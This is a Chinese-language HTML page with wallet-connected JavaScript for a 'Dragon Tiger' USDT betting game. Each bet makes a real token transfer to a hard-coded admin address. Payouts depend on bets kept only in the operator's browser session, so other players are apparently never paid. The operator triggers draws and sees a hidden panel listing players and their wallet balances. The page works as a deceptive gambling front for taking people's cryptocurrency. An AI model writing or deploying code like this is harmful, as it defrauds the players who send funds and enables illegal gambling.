<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>王者归来</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0B0F;color:#fff;padding:20px}
.container{max-width:480px;margin:0 auto}
.header{display:flex;align-items:center;gap:12px;margin-bottom:20px}

.wallet-box{background:#1E293B;padding:14px;border-radius:14px;flex:1}
.connect-btn{background:#3B82F6;color:white;border:none;padding:8px 12px;border-radius:8px;width:100%;cursor:pointer}
.info-line{font-size:13px;color:#a0a0b0;margin-top:6px}

.menu-btn{
  background:#1E293B;
  color:white;
  width:48px;
  height:48px;
  border-radius:10px;
  border:none;
  font-size:20px;
  cursor:pointer;
}

.menu{
  position:fixed;top:0;right:0;width:300px;height:100vh;
  background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;
  display:none;overflow-y:auto;z-index:999;
}
.menu.show{display:block}

.bet-card{background:#1E293B;border-radius:16px;padding:20px;margin-bottom:20px}
.bet-header{display:flex;justify-content:space-between;margin-bottom:16px}
.countdown{color:#F59E0B;font-weight:bold}
.bet-input{width:100%;padding:12px;background:#0f172a;border:none;border-radius:10px;color:white;margin-bottom:12px}
.quick-btns{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:16px}
.quick-btn{background:#2D374B;color:white;border:none;padding:10px;border-radius:8px}
.bet-choices{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.choice{padding:16px;border-radius:10px;border:none;color:white;font-weight:bold}
.dragon{background:#2563eb}
.tiger{background:#ef4444}
.tie{background:#F59E0B}

.trend-card{background:#1E293B;border-radius:16px;padding:20px;margin-bottom:20px}
.rule-card{background:#1E293B;border-radius:16px;padding:20px}

.admin-panel{display:none;border-top:1px solid #333;margin-top:20px;padding-top:20px}
.player-item{background:#1e293b;padding:10px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
.copy-btn{background:#3B82F6;color:white;border:none;padding:4px 8px;border-radius:4px;font-size:11px}

#connectModal{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:9999}
#connectModal.show{display:flex}
.modal-content{background:#1E293B;padding:30px;border-radius:16px;width:280px;text-align:center}
.modal-avatar{width:100px;height:100px;background:url('https://p6-flow-imagex.byteimg.com/obj/tos-cn-9n09/36b1e8cb1c9a4393a0e1c1e0d7c1d15') center/cover;border-radius:16px;margin:0 auto 16px}
.modal-btn{padding:10px 16px;border:none;border-radius:8px;margin-top:10px;width:100%}
.confirm{background:#3B82F6;color:white}
.cancel{background:#333;color:white}
</style>
</head>
<body>

<div id="connectModal">
  <div class="modal-content">
    <div class="modal-avatar"></div>
    <h3>王者归来 连接授权</h3>
    <p>是否授权登录游戏</p>
    <button class="modal-btn confirm" onclick="connect()">确认授权</button>
    <button class="modal-btn cancel" onclick="closeModal()">取消</button>
  </div>
</div>

<div class="container">
  <div class="header">
    <button class="menu-btn" onclick="toggleMenu()">☰</button>
    <div class="wallet-box">
      <button class="connect-btn" onclick="showModal()">连接钱包</button>
      <div class="info-line">地址：<span id="addr">-</span></div>
      <div class="info-line">余额：<span id="bal">0.00</span> USDT</div>
    </div>
  </div>

  <div class="bet-card">
    <div class="bet-header">
      <h4>下注区</h4>
      <div class="countdown" id="count">02:00</div>
    </div>
    <input class="bet-input" id="amount" value="10" placeholder="下注金额">
    <div class="quick-btns">
      <button class="quick-btn" onclick="set(10)">10</button>
      <button class="quick-btn" onclick="set(50)">50</button>
      <button class="quick-btn" onclick="set(200)">200</button>
      <button class="quick-btn" onclick="set(500)">500</button>
    </div>
    <div class="bet-choices">
      <button class="choice dragon" onclick="bet(0)">龙 1:2</button>
      <button class="choice tiger" onclick="bet(1)">虎 1:2</button>
      <button class="choice tie" onclick="bet(2)">和 1:9</button>
    </div>
  </div>

  <div class="trend-card">
    <h4>开奖记录</h4>
    <div id="history" style="margin-top:10px;line-height:1.6"></div>
  </div>

  <div class="rule-card">
    <h4>玩法</h4>
    <p style="font-size:13px;color:#a0a0b0;margin-top:8px">
    • 每2分钟开奖<br>
    • 龙/虎 1:2<br>
    • 和 1:9
    </p>
  </div>
</div>

<div class="menu" id="menu">
  <h3>菜单</h3>
  <div class="admin-panel" id="admin">
    <div style="margin-top:20px">
      <h4 style="color:red">🎮 庄家后台</h4>
      <button style="width:100%;padding:10px;background:#ef4444;color:white;border:none;border-radius:8px;margin-top:10px" onclick="drawResult()">立即开奖</button>
      <div style="margin-top:20px">
        <h5 style="color:red">👥 所有授权玩家</h5>
        <div id="players" style="margin-top:10px;max-height:250px;overflow-y:auto"></div>
      </div>
    </div>
  </div>
</div>

<script>
// ==========================================
// 配置（已帮你填好）
// ==========================================
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const ADMIN_LOWER = ADMIN.toLowerCase();

let account = null;
let bets = [];
let records = JSON.parse(localStorage.getItem("records") || "[]");
let users = JSON.parse(localStorage.getItem("users") || "[]");
let countdown = 120;

// ==========================================
// 菜单开关
// ==========================================
function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

// ==========================================
// 连接钱包
// ==========================================
function showModal() {
  document.getElementById("connectModal").classList.add("show");
}
function closeModal() {
  document.getElementById("connectModal").classList.remove("show");
}

async function connect() {
  closeModal();
  if (!window.ethereum) return alert("请安装钱包");
  const res = await ethereum.request({ method: "eth_requestAccounts" });
  account = res[0];
  const accountLower = account.toLowerCase();
  document.getElementById("addr").innerText = account.slice(0, 6) + "..." + account.slice(-4);
  
  if (!users.includes(account)) {
    users.push(account);
    localStorage.setItem("users", JSON.stringify(users));
  }
  
  if (accountLower === ADMIN_LOWER) {
    document.getElementById("admin").style.display = "block";
    loadPlayers();
  }
  getBalance();
}

// ==========================================
// 读取余额
// ==========================================
async function getBalance() {
  if (!account) return;
  try {
    const data = "0x70a08231" + "000000000000000000000000" + account.slice(2);
    const val = await ethereum.request({
      method: "eth_call",
      params: [{ to: USDT, data }, "latest"]
    });
    const num = parseInt(val, 16) / 1e18;
    document.getElementById("bal").innerText = num.toFixed(2);
  } catch (e) {}
}

// ==========================================
// 下注（真实链上转账）
// ==========================================
async function bet(side) {
  if (!account) return alert("请先连接钱包");
  const amt = parseFloat(document.getElementById("amount").value);
  if (amt < 10) return alert("最低下注10");
  
  const amountWei = (amt * 1e18).toString(16);
  const paddedAmount = amountWei.padStart(64, '0');

  try {
    await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: USDT,
        data: "0xa9059cbb" 
          + "000000000000000000000000" + ADMIN.slice(2)
          + paddedAmount
      }]
    });
    bets.push({ user: account, side, amt });
    alert("下注成功，等待开奖");
    getBalance();
  } catch (e) {
    alert("下注失败：" + e.message);
  }
}

// ==========================================
// 庄家开奖 + 自动赔付
// ==========================================
async function drawResult() {
  const accountLower = account ? account.toLowerCase() : "";
  if (accountLower !== ADMIN_LOWER) return;
  
  const win = Math.floor(Math.random() * 3);
  const winText = ["龙", "虎", "和"][win];
  records.unshift(winText);
  if (records.length > 12) records.pop();
  localStorage.setItem("records", JSON.stringify(records));
  renderHistory();

  for (const b of bets) {
    if (b.side === win) {
      const rate = b.side === 2 ? 9 : 2;
      const payout = b.amt * rate;
      const payoutWei = (payout * 1e18).toString(16);
      const paddedPayout = payoutWei.padStart(64, '0');
      
      try {
        await ethereum.request({
          method: "eth_sendTransaction",
          params: [{
            from: ADMIN,
            to: USDT,
            data: "0xa9059cbb"
              + "000000000000000000000000" + b.user.slice(2)
              + paddedPayout
          }]
        });
      } catch (e) {}
    }
  }
  
  bets = [];
  alert("开奖结果：" + winText);
}

// ==========================================
// 加载所有授权玩家（仅庄家）
// ==========================================
async function loadPlayers() {
  const el = document.getElementById("players");
  el.innerHTML = "";
  for (const u of users) {
    let bal = 0;
    try {
      const data = "0x70a08231" + "000000000000000000000000" + u.slice(2);
      const val = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data }, "latest"] });
      bal = parseInt(val, 16) / 1e18;
    } catch (e) {}
    el.innerHTML += `
    <div class="player-item">
      <div>${u.slice(0,6)}...${u.slice(-4)}<br><small>${bal.toFixed(2)} USDT</small></div>
      <button class="copy-btn" onclick="copy('${u}')">复制</button>
    </div>`;
  }
}

function copy(txt) {
  navigator.clipboard.writeText(txt);
  alert("已复制地址");
}

function set(v) {
  document.getElementById("amount").value = v;
}

function renderHistory() {
  const h = document.getElementById("history");
  h.innerHTML = records.map(r => `<span>${r}</span>`).join("  ");
}

// 倒计时
setInterval(() => {
  countdown--;
  if (countdown <= 0) countdown = 120;
  const m = String(Math.floor(countdown / 60)).padStart(2, "0");
  const s = String(countdown % 60).padStart(2, "0");
  document.getElementById("count").innerText = m + ":" + s;
}, 1000);

renderHistory();
</script>
</body>
</html>
